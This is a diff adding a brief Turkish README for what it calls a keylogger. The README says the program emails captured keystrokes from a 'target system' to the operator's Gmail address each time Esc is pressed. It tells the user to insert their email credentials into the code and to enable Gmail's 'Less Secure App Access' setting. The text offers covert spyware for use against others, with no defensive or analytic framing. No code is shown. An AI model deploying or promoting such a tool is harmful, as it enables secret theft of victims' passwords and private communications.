@@ -1,0 +1,6 @@
+
+Bu bir keylogerdir ve yapılan işlemleri e posta aracılığı ile kişiye gönderir lütfen kodu açın va e posta bilgilerinizi koda enjekte edin
+
+Hedef sistemin her "esc" tuşuna bastığında belirlediğimiz mail adresine mail olarak göndermesini sağlayacağız. Bize log kayıtlarını gönderecek mail adresinin mutlaka "gmail" olması lazım. Aynı zamanda dikkat edilmesi gereken bir husus ta şu ki:
+
+İki adımlı doğrulaması olmayan hesaplar için devre dışı bırakılan, Gmail tarafından opsiyonel olarak sunulan "Daha Az Güvenli Uygulama Erişimi" bölümünü bu linkten Açık hale getirmeniz gerekmekte. Burayı atlarsanız mail göndermeyecektir
